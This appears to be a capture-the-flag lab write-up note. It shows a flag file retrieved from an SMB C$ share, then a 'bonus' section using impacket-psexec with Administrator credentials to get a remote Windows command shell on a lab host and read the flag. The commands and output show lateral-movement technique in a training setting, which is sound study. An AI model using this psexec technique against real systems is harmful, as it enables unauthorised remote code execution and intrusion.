# flag.txt

Downloaded the flag when perusing the C$ share. See [[Tactics/03 - SMB Access|03 - SMB Access]]

```
┌──(kali㉿kali)-[~]
└─$ ls -l flag.txt && md5sum flag.txt       
-rw-r--r-- 1 kali kali 32 Aug 16 09:32 flag.txt
7bab09dad3ab841bcb1a2d6af55a1867  flag.txt


```

# Bonus
## Getting a shell via impacket-psexec
```
┌──(kali㉿kali)-[~]
└─$ impacket-psexec WORKGROUP/Administrator@10.129.91.210
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 10.129.91.210.....
[*] Found writable share ADMIN$
[*] Uploading file GiOYxRnM.exe
[*] Opening SVCManager on 10.129.91.210.....
[*] Creating service rNKt on 10.129.91.210.....
[*] Starting service rNKt.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 

<SNIP>

C:\Windows> dir C:\flag.txt /s /p
 Volume in drive C has no label.
 Volume Serial Number is EEE0-FCDB

 Directory of C:\Users\Administrator\Desktop

04/23/2021  02:39 AM                32 flag.txt
               1 File(s)             32 bytes

     Total Files Listed:
               1 File(s)             32 bytes
               0 Dir(s)   4,746,412,032 bytes free

C:\Windows> type C:\Users\Administrator\Desktop\flag.txt 
<REDACTED FOR WALKTHROUGH :)>
```